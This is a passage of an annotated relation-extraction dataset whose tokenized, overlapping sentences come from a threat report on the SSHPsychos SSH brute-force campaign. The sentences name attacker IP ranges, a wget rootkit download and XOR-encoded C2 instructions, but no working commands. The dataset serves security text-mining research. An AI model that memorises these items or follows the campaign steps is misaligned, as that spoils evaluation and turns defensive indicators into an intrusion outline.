"index": "19_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [153, 153], "name": "Python", "pos": [22, 23], "index": "20_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [157, 157], "name": "sensitive information", "pos": [26, 28], "index": "21_0"}]], "labels": [{"r": "RD", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "RD", "evidence": [0], "h": 0, "t": 2}, {"r": "WR", "evidence": [0], "h": 0, "t": 2}, {"r": "WR", "evidence": [1, 2], "h": 3, "t": 5}, {"r": "RD", "evidence": [1, 2], "t": 4, "h": 5}, {"r": "WR", "evidence": [1, 2], "t": 4, "h": 5}, {"r": "CO", "evidence": [2, 3], "h": 5, "t": 6}, {"r": "WR", "evidence": [3], "h": 7, "t": 8}, {"r": "CO", "evidence": [3], "h": 8, "t": 9}, {"r": "CO", "evidence": [3, 4], "t": 8, "h": 12}, {"r": "FR", "evidence": [5], "h": 13, "t": 14}, {"r": "FR", "evidence": [5], "h": 13, "t": 15}, {"r": "RD", "evidence": [5], "h": 14, "t": 16}, {"r": "RD", "evidence": [5], "h": 15, "t": 16}, {"r": "WR", "evidence": [5], "h": 14, "t": 17}, {"r": "WR", "evidence": [5], "h": 14, "t": 17}, {"r": "WR", "evidence": [5], "h": 14, "t": 17}, {"r": "WR", "evidence": [5], "h": 14, "t": 17}, {"r": "FR", "evidence": [6], "h": 18, "t": 20}, {"r": "WR", "evidence": [6], "h": 18, "t": 21}]}, {"title": "665-0", "sents": [["Graphic", "Showing", "SSH", "Psychos", "SSH", "Traffic", "vs", "Rest", "of", "Internet", "(", "Green", ")", "BehaviorThe", "primary", "focus", "of", "SSHPsychos", "has", "been", "SSH", "brute", "force", "attacks", "."], ["The", "traffic", "from", "SSHPsychos", "dwarfs", "the", "combined", "SSH", "login", "attempt", "traffic", "from", "the", "rest", "of", "the", "Internet", "."], ["High", "Level", "Overview", "of", "AttackThe", "behavior", "consists", "of", "large", "amounts", "of", "SSH", "brute", "force", "login", "attempts", "from", "103.41.124.0/23", ",", "only", "attempting", "to", "guess", "the", "password", "for", "the", "root", "user", ",", "with", "over", "300,000", "unique", "passwords", "."], ["Once", "a", "successful", "login", "is", "achieved", "the", "brute", "forcing", "stops", "."], ["The", "next", "step", "involves", "a", "login", "from", "a", "completely", "different", "IP", "ranges", "owned", "by", "shared", "hosting", "companies", "based", "out", "of", "the", "United", "States", "."], ["After", "login", "is", "achieved", "a", "wget", "request", "is", "sent", "outbound", "for", "a", "single", "file", "which", "has", "been", "identified", "as", "a", "DDoS", "rootkit", "."], ["The", "file", "has", "been", "observed", "being", "downloaded", "from", "hardcoded", "IP", "addresses", "as", "well", "as", "from", "specific", "domains", "which", "resolve", "to", "the", "same", "address", "(", "23.234.60.140", ")", "."], ["Domain", "Information", "for", "Server", "Hosting", "DDoS", "KitOnce", "the", "rootkit", "is", "installed", "additional", "instructions", "are", "downloaded", "via", "an", "XOR", "encoded", "file", "from", "one", "of", "the", "C2", "servers", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [2, 2], "name": "SSH Psychos", "pos": [2, 4], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [17, 17], "name": "SSHPsychos", "pos": [17, 18], "index": "1_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [20, 20], "name": "SSH", "pos": [20, 21], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [28, 28], "name": "SSHPsychos", "pos": [3, 4], "index": "3_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [32, 32], "name": "SSH", "pos": [7, 8], "index": "4_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [48, 48], "name": "behavior", "pos": [5, 6], "index": "5_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [54, 54], "name": "SSH", "pos": [11, 12], "index": "6_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [60, 60], "name": "103.41.124.0/23", "pos": [17, 18], "index": "7_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [91, 91], "name": "next step", "pos": [1, 3], "index": "8_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [119, 119], "name": "wget", "pos": [5, 6], "index": "9_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [134, 134], "name": "DDoS rootkit", "pos": [20, 22], "index": "10_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [138, 138], "name": "file", "pos": [1, 2], "index": "11_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [146, 146], "name": "IP addresses", "pos": [9, 11], "index": "12_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [161, 161], "name": "23.234.60.140", "pos": [24, 25], "index": "13_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [175, 175], "name": "additional instructions", "pos": [11, 13], "index": "14_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [181, 181], "name": "XOR encoded file", "pos": [17, 20], "index": "15_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [188, 188], "name": "C2 servers", "pos": [24, 26], "index": "16_0"}]], "labels": [{"r": "CO", "evidence": [0], "t": 0, "h": 1}, {"r": "CO", "evidence": [0, 1], "h": 1, "t": 3}, {"r": "CO", "evidence": [0, 1, 2], "h": 1, "t": 5}, {"r": "CO", "evidence": [0, 1, 2, 3, 4], "h": 1, "t": 8}, {"r": "CO", "evidence": [0, 1], "h": 2, "t": 4}, {"r": "CO", "evidence": [0, 1, 2], "h": 2, "t": 6}, {"r": "FR", "evidence": [2], "h": 5, "t": 6}, {"r": "ST", "evidence": [2], "h": 6, "t": 7}, {"r": "RF", "evidence": [2], "h": 6, "t": 7}, {"r": "FR", "evidence": [4, 5], "h": 8, "t": 9}, {"r": "WR", "evidence": [5], "h": 9, "t": 10}, {"r": "ST", "evidence": [5, 6], "h": 9, "t": 12}, {"r": "RF", "evidence": [5, 6], "h": 9, "t": 12}, {"r": "CO", "evidence": [5, 6], "h": 10, "t": 11}, {"r": "CO", "evidence": [5, 6, 7], "h": 10, "t": 15}, {"r": "CO", "evidence": [6], "h": 12, "t": 13}]}, {"title": "665-1", "sents": [["The", "traffic", "from", "SSHPsychos", "dwarfs", "the", "combined", "SSH", "login", "attempt", "traffic", "from", "the", "rest", "of", "the", "Internet", "."], ["High", "Level", "Overview", "of", "AttackThe", "behavior", "consists", "of", "large", "amounts", "of", "SSH", "brute", "force", "login", "attempts", "from", "103.41.124.0/23", ",", "only", "attempting", "to", "guess", "the", "password", "for", "the", "root", "user", ",", "with", "over", "300,000", "unique", "passwords", "."], ["Once", "a", "successful", "login", "is", "achieved", "the", "brute", "forcing", "stops", "."], ["The", "next", "step", "involves", "a", "login", "from", "a", "completely", "different", "IP", "ranges", "owned", "by", "shared", "hosting", "companies", "based", "out", "of", "the", "United", "States", "."], ["After", "login", "is", "achieved", "a", "wget", "request", "is", "sent", "outbound", "for", "a", "single", "file", "which", "has", "been", "identified", "as", "a", "DDoS", "rootkit", "."], ["The", "file", "has", "been", "observed", "being", "downloaded", "from", "hardcoded", "IP", "addresses", "as", "well", "as", "from", "specific", "domains", "which", "resolve", "to", "the", "same", "address", "(", "23.234.60.140", ")", "."], ["Domain", "Information", "for", "Server", "Hosting", "DDoS", "KitOnce", "the", "rootkit", "is", "installed", "additional", "instructions", "are", "downloaded", "via", "an", "XOR", "encoded", "file", "from", "one", "of", "the", "C2", "servers", "."], ["Level", "3", "decoded", "one", "of", "the", "configuration", "files", "a", "sample", "of", "which", "can", "be", "found", "below", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [3, 3], "name": "SSHPsychos", "pos": [3, 4], "index": "0_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [7, 7], "name": "SSH", "pos": [7, 8], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [23, 23], "name": "behavior", "pos": [5, 6], "index": "2_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [29, 29], "name": "SSH", "pos": [11, 12], "index": "3_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [35, 35], "name": "103.41.124.0/23", "pos": [17, 18], "index": "4_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [66, 66], "name": "next step", "pos": [1, 3], "index": "5_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [94, 94], "name": "wget", "pos": [5, 6], "index": "6_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [109, 109], "name": "DDoS rootkit", "pos": [20, 22], "index": "7_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [113, 113], "name": "file", "pos": [1, 2], "index": "8_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [121, 121], "name": "IP addresses", "pos": [9, 11], "index": "9_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [136, 136], "name": "23.234.60.140", "pos": [24, 25], "index": "10_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [150, 150], "name": "additional instructions", "pos": [11, 13], "index": "11_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [156, 156], "name": "XOR encoded file", "pos": [17, 20], "index": "12_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [163, 163], "name": "C2 servers", "pos": [24, 26], "index": "13_0"}]], "labels": [{"r": "FR", "evidence": [1], "h": 2, "t": 3}, {"r": "ST", "evidence": [1], "h": 3, "t": 4}, {"r": "RF", "evidence": [1], "h": 3, "t": 4}, {"r": "FR", "evidence": [3, 4], "h": 5, "t": 6}, {"r": "WR", "evidence": [4], "h": 6, "t": 7}, {"r": "ST", "evidence": [4, 5], "h": 6, "t": 9}, {"r": "RF", "evidence": [4, 5], "h": 6, "t": 9}, {"r": "CO", "evidence": [4, 5], "h": 7, "t": 8}, {"r": "CO", "evidence": [4, 5, 6], "h": 7, "t": 12}, {"r": "CO", "evidence": [5], "h": 9, "t": 10}]}, {"title": "665-2", "sents": [["High", "Level", "Overview", "of", "AttackThe", "behavior", "consists", "of", "large", "amounts", "of", "SSH", "brute", "force", "login", "attempts", "from", "103.41.124.0/23", ",", "only", "attempting", "to", "guess", "the", "password", "for", "the", "root", "user", ",", "with", "over", "300,000", "unique", "passwords", "."], ["Once", "a", "successful", "login", "is", "achieved", "the", "brute", "forcing", "stops", "."], ["The", "next", "step", "involves", "a", "login", "from", "a", "completely", "different", "IP", "ranges", "owned", "by", "shared", "hosting", "companies", "based", "out", "of", "the", "United", "States", "."], ["After", "login", "is", "achieved", "a", "wget", "request", "is", "sent", "outbound", "for", "a", "single", "file", "which", "has", "been", "identified", "as", "a", "DDoS", "rootkit", "."], ["The", "file", "has", "been", "observed", "being", "downloaded", "from", "hardcoded", "IP", "addresses", "as", "well", "as", "from", "specific", "domains", "which", "resolve", "to", "the", "same", "address", "(", "23.234.60.140", ")", "."], ["Domain", "Information", "for", "Server", "Hosting", "DDoS", "KitOnce", "the", "rootkit", "is", "installed", "additional", "instructions", "are", "downloaded", "via", "an", "XOR", "encoded", "file", "from", "one", "of", "the", "C2", "servers", "."], ["Level", "3", "decoded", "one", "of", "the", "configuration", "files", "a", "sample", "of", "which", "can", "be", "found", "below", "."], ["Level", "3", "analyzed", "the", "behavior", "of", "the", "suspect", "networks", "and", "confirmed", "that", "no", "legitimate", "traffic", "is", "originating", "or", "destined", "for", "103.41.124.0/23", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [5, 5], "name": "behavior", "pos": [5, 6], "index": "0_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [11, 11], "name": "SSH", "pos": [11, 12], "index": "1_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [17, 17], "name": "103.41.124.0/23", "pos": [17, 18], "index": "2_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [48, 48], "name": "next step", "pos": [1, 3], "index": "3_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [76, 76], "name": "wget", "pos": [5, 6], "index": "4_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [91, 91], "name": "DDoS rootkit", "pos": [20, 22], "index": "5_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [95, 95], "name": "file", "pos": [1, 2], "index": "6_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [103, 103], "name": "IP addresses", "pos": [9, 11], "index": "7_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [118, 118], "name": "23.234.60.140", "pos": [24, 25], "index": "8_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [132, 132], "name": "additional instructions", "pos": [11, 13], "index": "9_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [138, 138], "name": "XOR encoded file", "pos": [17, 20], "index": "10_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [145, 145], "name": "C2 servers", "pos": [24, 26], "index": "11_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [169, 169], "name": "behavior", "pos": [4, 5], "index": "12_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [185, 185], "name": "103.41.124.0/23", "pos": [20, 21], "index": "13_0"}]], "labels": [{"r": "FR", "evidence": [0], "h": 0, "t": 1}, {"r": "ST", "evidence": [0], "h": 1, "t": 2}, {"r": "RF", "evidence": [0], "h": 1, "t": 2}, {"r": "FR", "evidence": [2, 3], "h": 3, "t": 4}, {"r": "WR", "evidence": [3], "h": 4, "t": 5}, {"r": "ST", "evidence": [3, 4], "h": 4, "t": 7}, {"r": "RF", "evidence": [3, 4], "h": 4, "t": 7}, {"r": "CO", "evidence": [3, 4], "h": 5, "t": 6}, {"r": "CO", "evidence": [3, 4, 5], "h": 5, "t": 10}, {"r": "CO", "evidence": [4], "h": 7, "t": 8}, {"r": "RD", "evidence": [4, 5, 6, 7], "t": 6, "h": 12}, {"r": "EX", "evidence": [4, 5, 6, 7], "t": 6, "h": 12}, {"r": "RD", "evidence": [5, 6, 7], "t": 9, "h": 12}, {"r": "RD", "evidence": [5, 6, 7], "t": 9, "h": 12}, {"r": "WR", "evidence": [5, 6, 7], "t": 9, "h": 12}, {"r": "ST", "evidence": [5, 6, 7], "t": 11, "h": 12}, {"r": "ST", "evidence": [5, 6, 7], "t": 11, "h": 12}, {"r": "ST", "evidence": [5, 6, 7], "t": 11, "h": 12}, {"r": "ST", "evidence": [5, 6, 7], "t": 11, "h": 12}, {"r": "RF", "evidence": [5, 6, 7], "t": 11, "h": 12}, {"r": "ST", "evidence": [7], "h": 12, "t": 13}, {"r": "RF", "evidence": [7], "h": 12, "t": 13}]}, {"title": "665-3", "sents": [["Once", "a", "successful", "login", "is", "achieved", "the", "brute", "forcing", "stops", "."], ["The", "next", "step", "involves", "a", "login", "from", "a", "completely", "different", "IP", "ranges", "owned", "by", "shared", "hosting", "companies", "based", "out", "of", "the", "United", "States", "."], ["After", "login", "is", "achieved", "a", "wget", "request", "is", "sent", "outbound", "for", "a", "single", "file", "which", "has", "been", "identified", "as", "a", "DDoS", "rootkit", "."], ["The", "file", "has", "been", "observed", "being", "downloaded", "from", "hardcoded", "IP", "addresses", "as", "well", "as", "from", "specific", "domains", "which", "resolve", "to", "the", "same", "address", "(", "23.234.60.140", ")", "."], ["Domain", "Information", "for", "Server", "Hosting", "DDoS", "KitOnce", "the", "rootkit", "is", "installed", "additional", "instructions", "are", "downloaded", "via", "an", "XOR", "encoded", "file", "from", "one", "of", "the", "C2", "servers", "."], ["Level", "3", "decoded", "one", "of", "the", "configuration", "files", "a", "sample", "of", "which", "can", "be", "found", "below", "."], ["Level", "3", "analyzed", "the", "behavior", "of", "the", "suspect", "networks", "and", "confirmed", "that", "no", "legitimate", "traffic", "is", "originating", "or", "destined", "for", "103.41.124.0/23", "."], ["On", "March", "30th", "SSHPsychos", "suddenly", "pivoted", "."]], "vertexSet": [[{"type": "MP", "sent_id": 1, "global_pos": [12, 12], "name": "next step", "pos": [1, 3], "index": "0_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [40, 40], "name": "wget", "pos": [5, 6], "index": "1_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [55, 55], "name": "DDoS rootkit", "pos": [20, 22], "index": "2_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [59, 59], "name": "file", "pos": [1, 2], "index": "3_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [67, 67], "name": "IP addresses", "pos": [9, 11], "index": "4_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [82, 82], "name": "23.234.60.140", "pos": [24, 25], "index": "5_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [96, 96], "name": "additional instructions", "pos": [11, 13], "index": "6_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [102, 102], "name": "XOR encoded file", "pos": [17, 20], "index": "7_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [109, 109], "name": "C2 servers", "pos": [24, 26], "index": "8_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [133, 133], "name": "behavior", "pos": [4, 5], "index": "9_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [149, 149], "name": "103.41.124.0/23", "pos": [20, 21], "index": "10_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [154, 154], "name": "SSHPsychos", "pos": [3, 4], "index": "11_0"}]], "labels": [{"r": "FR", "evidence": [1, 2], "h": 0, "t": 1}, {"r": "WR", "evidence": [2], "h": 1, "t": 2}, {"r": "ST", "evidence": [2, 3], "h": 1, "t": 4}, {"r": "RF", "evidence": [2, 3], "h": 1, "t": 4}, {"r": "CO", "evidence": [2, 3], "h": 2, "t": 3}, {"r": "CO", "evidence": [2, 3, 4], "h": 2, "t": 7}, {"r": "CO", "evidence": [3], "h": 4, "t": 5}, {"r": "RD", "evidence": [3, 4, 5, 6], "t": 3, "h": 9}, {"r": "EX", "evidence": [3, 4, 5, 6], "t": 3, "h": 9}, {"r": "RD", "evidence": [4, 5, 6], "t": 6, "h": 9}, {"r": "RD", "evidence": [4, 5, 6], "t": 6, "h": 9}, {"r": "WR", "evidence": [4, 5, 6], "t": 6, "h": 9}, {"r": "ST", "evidence": [4, 5, 6], "t": 8, "h": 9}, {"r": "ST", "evidence": [4, 5, 6], "t": 8, "h": 9}, {"r": "ST", "evidence": [4, 5, 6], "t": 8, "h": 9}, {"r": "ST", "evidence": [4, 5, 6], "t": 8, "h": 9}, {"r": "RF", "evidence": [4, 5, 6], "t": 8, "h": 9}, {"r": "ST", "evidence": [6], "h": 9, "t": 10}, {"r": "RF", "evidence": [6], "h": 9, "t": 10}, {"r": "CO", "evidence": [6, 7], "h": 9, "t": 11}]}, {"title": "665-4", "sents": [["The", "next", "step", "involves", "a", "login", "from", "a", "completely", "different", "IP", "ranges", "owned", "by", "shared", "hosting", "companies", "based", "out", "of", "the", "United", "States", "."], ["After", "login", "is", "achieved", "a", "wget", "request", "is", "sent", "outbound", "for", "a", "single", "file", "which", "has", "been", "identified", "as", "a", "DDoS", "rootkit", "."], ["The", "file", "has", "been", "observed", "being", "downloaded", "from", "hardcoded", "IP", "addresses", "as", "well", "as", "from", "specific", "domains", "which", "resolve", "to", "the", "same", "address", "(", "23.234.60.140", ")", "."], ["Domain", "Information", "for", "Server", "Hosting", "DDoS", "KitOnce", "the", "rootkit", "is", "installed", "additional", "instructions", "are", "downloaded", "via", "an", "XOR", "encoded", "file", "from", "one", "of", "the", "C2", "servers", "."], ["Level", "3", "decoded", "one", "of", "the", "configuration", "files", "a", "sample", "of", "which", "can", "be", "found", "below", "."], ["Level", "3", "analyzed", "the", "behavior", "of", "the", "suspect", "networks", "and", "confirmed", "that", "no", "legitimate", "traffic", "is", "originating", "or", "destined", "for", "103.41.124.0/23", "."], ["On", "March", "30th", "SSHPsychos", "suddenly", "pivoted", "."], ["The", "original", "/23", "network", "went", "from", "a", "huge", "volume", "of", "SSH", "brute", "force", "attempts", "to", "almost", "no", "activity", "and", "a", "new", "/23", "network", "began", "large", "amounts", "of", "SSH", "brute", "forcing", "following", "the", "exact", "same", "behavior", "associated", "with", "SSHPsychos", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "next step", "pos": [1, 3], "index": "0_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [29, 29], "name": "wget", "pos": [5, 6], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [44, 44], "name": "DDoS rootkit", "pos": [20, 22], "index": "2_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [48, 48], "name": "file", "pos": [1, 2], "index": "3_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [56, 56], "name": "IP addresses", "pos": [9, 11], "index": "4_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [71, 71], "name": "23.234.60.140", "pos": [24, 25], "index": "5_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [85, 85], "name": "additional instructions", "pos": [11, 13], "index": "6_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [91, 91], "name": "XOR encoded file", "pos": [17, 20], "index": "7_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [98, 98], "name": "C2 servers", "pos": [24, 26], "index": "8_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [122, 122], "name": "behavior", "pos": [4, 5], "index": "9_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [138, 138], "name": "103.41.124.0/23", "pos": [20, 21], "index": "10_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [143, 143], "name": "SSHPsychos", "pos": [3, 4], "index": "11_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [157, 157], "name": "SSH", "pos": [10, 11], "index": "12_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [174, 174], "name": "SSH", "pos": [27, 28], "index": "13_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [184, 184], "name": "SSHPsychos", "pos": [37, 38], "index": "14_0"}]], "labels": [{"r": "FR", "evidence": [0, 1], "h": 0, "t": 1}, {"r": "WR", "evidence": [1], "h": 1, "t": 2}, {"r": "ST", "evidence": [1, 2], "h": 1, "t": 4}, {"r": "RF", "evidence": [1, 2], "h": 1, "t": 4}, {"r": "CO", "evidence": [1, 2], "h": 2, "t": 3}, {"r": "CO", "evidence": [1, 2, 3], "h": 2, "t": 7}, {"r": "CO", "evidence": [2], "h": 4, "t": 5}, {"r": "RD", "evidence": [2, 3, 4, 5], "t": 3, "h": 9}, {"r": "EX", "evidence": [2, 3, 4, 5], "t": 3, "h": 9}, {"r": "RD", "evidence": [3, 4, 5], "t": 6, "h": 9}, {"r": "RD", "evidence": [3, 4, 5], "t": 6, "h": 9}, {"r": "WR", "evidence": [3, 4, 5], "t": 6, "h": 9}, {"r": "ST", "evidence": [3, 4, 5], "t": 8, "h": 9}, {"r": "ST", "evidence": [3, 4, 5], "t": 8, "h": 9}, {"r": "ST", "evidence": [3, 4, 5], "t": 8, "h": 9}, {"r": "ST", "evidence": [3, 4, 5], "t": 8, "h": 9}, {"r": "RF", "evidence": [3, 4, 5], "t": 8, "h": 9}, {"r": "ST", "evidence": [5], "h": 9, "t": 10}, {"r": "RF", "evidence": [5], "h": 9, "t": 10}, {"r": "CO", "evidence": [5, 6], "h": 9, "t": 11}, {"r": "ST", "evidence": [5, 6, 7], "t": 10, "h": 12}, {"r": "RF", "evidence": [5, 6, 7], "t": 10, "h": 12}, {"r": "ST", "evidence": [5, 6, 7], "t": 10, "h": 12}, {"r": "RF", "evidence": [5, 6, 7], "t": 10, "h": 12}, {"r": "FR", "evidence": [7], "h": 13, "t": 14}, {"r": "CO", "evidence": [7], "h": 12, "t": 13}]}, {"title": "665-5", "sents": [["After", "login", "is", "achieved", "a", "wget", "request", "is", "sent", "outbound", "for", "a", "single", "file", "which", "has", "been", "identified", "as", "a", "DDoS", "rootkit", "."], ["The", "file", "has", "been", "observed", "being", "downloaded", "from", "hardcoded", "IP", "addresses", "as", "well", "as", "from", "specific", "domains", "which", "resolve", "to", "the", "same", "address", "(", "23.234.60.140", ")", "."], ["Domain", "Information", "for", "Server", "Hosting", "DDoS", "KitOnce", "the", "rootkit", "is", "installed", "additional", "instructions", "are", "downloaded", "via", "an", "XOR", "encoded", "file", "from", "one", "of", "the", "C2", "servers", "."], ["Level", "3", "decoded", "one", "of", "the", "configuration", "files", "a", "sample", "of", "which", "can", "be", "found", "below", "."], ["Level", "3", "analyzed", "the", "behavior", "of", "the", "suspect", "networks", "and", "confirmed", "that", "no", "legitimate", "traffic", "is", "originating", "or", "destined", "for", "103.41.124.0/23", "."], ["On", "March", "30th", "SSHPsychos", "suddenly", "pivoted", "."], ["The", "original", "/23", "network", "went", "from", "a", "huge", "volume", "of", "SSH", "brute", "force", "attempts", "to", "almost", "no", "activity", "and", "a", "new", "/23", "network", "began", "large", "amounts", "of", "SSH", "brute", "forcing", "following", "the", "exact", "same", "behavior", "associated", "with", "SSHPsychos", "."], ["The", "host", "serving", "the", "malware", "also", "changed", "and", "a", "new", "host", "(", "23.234.19.202", ")", "was", "seen", "providing", "the", "same", "file", "as", "discussed", "before", "a", "DDoS", "Rootkit", "."]], "vertexSet": [[{"type": "TP", "sent_id": 0, "global_pos": [5, 5], "name": "wget", "pos": [5, 6], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [20, 20], "name": "DDoS rootkit", "pos": [20, 22], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [24, 24], "name": "file", "pos": [1, 2], "index": "2_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [32, 32], "name": "IP addresses", "pos": [9, 11], "index": "3_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [47, 47], "name": "23.234.60.140", "pos": [24, 25], "index": "4_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [61, 61], "name": "additional instructions", "pos": [11, 13], "index": "5_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [67, 67], "name": "XOR encoded file", "pos": [17, 20], "index": "6_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [74, 74], "name": "C2 servers", "pos": [24, 26], "index": "7_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [98, 98], "name": "behavior", "pos": [4, 5], "index": "8_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [114, 114], "name": "103.41.124.0/23", "pos": [20, 21], "index": "9_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [119, 119], "name": "SSHPsychos", "pos": [3, 4], "index": "10_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [133, 133], "name": "SSH", "pos": [10, 11], "index": "11_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [150, 150], "name": "SSH", "pos": [27, 28], "index": "12_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [160, 160], "name": "SSHPsychos", "pos": [37, 38], "index": "13_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [166, 166], "name": "malware", "pos": [4, 5], "index": "14_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [174, 174], "name": "23.234.19.202", "pos": [12, 13], "index": "15_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [186, 186], "name": "DDoS Rootkit", "pos": [24, 26], "index": "16_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "ST", "evidence": [0, 1], "h": 0, "t": 3}, {"r": "RF", "evidence": [0, 1], "h": 0, "t": 3}, {"r": "CO", "evidence": [0, 1], "h": 1, "t": 2}, {"r": "CO", "evidence": [0, 1, 2], "h": 1, "t": 6}, {"r": "CO", "evidence": [1], "h": 3, "t": 4}, {"r": "RD", "evidence": [1, 2, 3, 4], "t": 2, "h": 8}, {"r": "EX", "evidence": [1, 2, 3, 4], "t": 2, "h": 8}, {"r": "RD", "evidence": [2, 3, 4], "t": 5, "h": 8}, {"r": "RD", "evidence": [2, 3, 4], "t": 5, "h": 8}, {"r": "WR", "evidence": [2, 3, 4], "t": 5, "h": 8}, {"r": "ST", "evidence": [2, 3, 4], "t": 7, "h": 8}, {"r": "ST", "evidence": [2, 3, 4], "t": 7, "h": 8}, {"r": "ST", "evidence": [2, 3, 4], "t": 7, "h": 8}, {"r": "ST", "evidence": [2, 3, 4], "t": 7, "h": 8}, {"r": "RF", "evidence": [2, 3, 4], "t": 7, "h": 8}, {"r": "ST", "evidence": [4], "h": 8, "t": 9}, {"r": "RF", "evidence": [4], "h": 8, "t": 9}, {"r": "CO", "evidence": [4, 5], "h": 8, "t": 10}, {"r": "ST", "evidence": [4, 5, 6], "t": 9, "h": 11}, {"r": "RF", "evidence": [4, 5, 6], "t": 9, "h": 11}, {"r": "ST", "evidence": [4, 5, 6], "t": 9, "h": 11}, {"r": "RF", "evidence": [4, 5, 6], "t": 9, "h": 11}, {"r": "FR", "evidence": [6], "h": 12, "t": 13}, {"r": "ST", "evidence": [6, 7], "h": 13, "t": 15}, {"r": "RF", "evidence": [6, 7], "h": 13, "t": 15}, {"r": "CO", "evidence": [6], "h": 11, "t": 12}, {"r": "UK", "evidence": [5, 6, 7], "t": 10, "h": 14}, {"r": "ST", "evidence": [7], "h": 14, "t": 15}, {"r": "RF", "evidence": [7], "h": 14, "t": 15}, {"r": "WR", "evidence": [7], "h": 14, "t": 16}]}, {"title": "665-6", "sents": [["The", "file", "has", "been", "observed", "being", "downloaded", "from", "hardcoded", "IP", "addresses", "as", "well", "as", "from", "specific", "domains", "which", "resolve", "to", "the", "same", "address", "(", "23.234.60.140", ")", "."], ["Domain", "Information", "for", "Server", "Hosting", "DDoS", "KitOnce", "the", "rootkit", "is", "installed", "additional", "instructions", "are", "downloaded", "via", "an", "XOR", "encoded", "file", "from", "one", "of", "the", "C2", "servers", "."], ["Level", "3", "decoded", "one", "of", "the", "configuration", "files", "a", "sample", "of", "which", "can", "be", "found", "below", "."], ["Level", "3", "analyzed", "the", "behavior", "of", "the", "suspect", "networks", "and", "confirmed", "that", "no", "legitimate", "traffic", "is", "originating", "or", "destined", "for", "103.41.124.0/23", "."], ["On", "March", "30th", 